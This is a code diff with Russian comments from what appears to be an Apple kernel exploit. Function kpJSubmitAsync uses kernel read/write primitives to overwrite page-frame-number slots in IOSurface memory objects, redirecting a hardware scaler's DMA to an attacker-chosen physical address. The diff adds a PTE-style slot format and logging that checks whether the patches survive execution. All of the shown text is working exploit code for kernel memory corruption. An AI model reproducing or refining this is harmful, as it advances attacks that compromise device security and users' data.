@@ -5845,7 +5845,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // и патчим pfn→ctl ДО любого submit: execute скейлера снимает DVA-снапшот
     // с уже пропатченного списка — никакой гонки с churn-окном.
     uint64_t surfVA = 0, rangesVA = 0, rootVA = 0;
-    uint64_t slotVAs[8] = {0}, origQs[8] = {0};
+    uint64_t slotVAs[8] = {0}, origQs[8] = {0}, newQs[8] = {0};
     int slotForm[8] = {0};
     int nSlots = 0;
     // 1.9.145: верификация поверхности по PFN-ЦЕПОЧКЕ (железная правда backingPA),
@@ -6103,6 +6103,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     else if (q == backingPA) form = 2;                // IOAddressRange.addr
                     else if (q == (backingPA >> 14)) form = 3;        // pfn64
                     else if ((uint32_t)q == pfn32) form = 4;          // pfn в low32
+                    else if ((q & 0xFFFF000000000000ULL) &&
+                             (q & 0x0000FFFFFFFFF000ULL) == backingPA) form = 5;  // PA + флаги (PTE-стиль)
                     if (!form) continue;
                     BOOL dup = NO;
                     for (int j = 0; j < nSlots; j++) if (slotVAs[j] == ob + o) { dup = YES; break; }
@@ -6110,8 +6112,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     slotVAs[nSlots] = ob + o;
                     origQs[nSlots] = q;
                     slotForm[nSlots] = form;
-                    kpNote(r, [NSString stringWithFormat:@"  pfn-слот#%d форма%d @ %#llx: %#018llx",
-                              nSlots, form, (unsigned long long)(ob + o), (unsigned long long)q]);
+                    kpNote(r, [NSString stringWithFormat:@"  pfn-слот#%d форма%d @ obj%d+%#x (%#llx): %#018llx",
+                              nSlots, form, k, o, (unsigned long long)(ob + o), (unsigned long long)q]);
                     nSlots++;
                 }
             }
@@ -6123,7 +6125,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                   ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
                                   : (slotForm[j] == 2) ? ctlPA
                                   : (slotForm[j] == 3) ? (ctlPA >> 14)
+                                  : (slotForm[j] == 5) ? ((origQs[j] & 0xFFFF000000000000ULL) | ctlPA)
                                   : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
+                    newQs[j] = newQ;
                     early_kwrite64(slotVAs[j], newQ);
                     uint64_t rb = early_kread64(slotVAs[j]);
                     if (rb == newQ) stuck++;
@@ -6493,6 +6497,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     IOSurfaceUnlock(dstS, 0, NULL);
     kpNote(r, [NSString stringWithFormat:@"  dst пиксели после execute: ненулевых = %d — %@", nzd,
               nzd ? @"DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)" : @"в dst пусто"]);
+    // 1.9.156: слоты после execute — откатило ли что-то pfn обратно (объяснение
+    // «DMA в оригинал» при пропатченном слоте) или execute читает ДРУГОЙ источник
+    for (int j = 0; j < nSlots; j++) {
+        uint64_t cur = early_kread64(slotVAs[j]);
+        kpNote(r, [NSString stringWithFormat:@"  слот#%d после execute: %#018llx — %@",
+                  j, (unsigned long long)cur,
+                  cur == newQs[j] ? @"патч НА МЕСТЕ (execute читает другой источник!)" :
+                  cur == origQs[j] ? @"ОТКАТИЛО в оригинал (кто-то переписал слот)" : @"ИЗМЕНЕНО третьим"]);
+    }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
     for (int j = 0; j < nSlots; j++)
         early_kwrite64(slotVAs[j], origQs[j]);
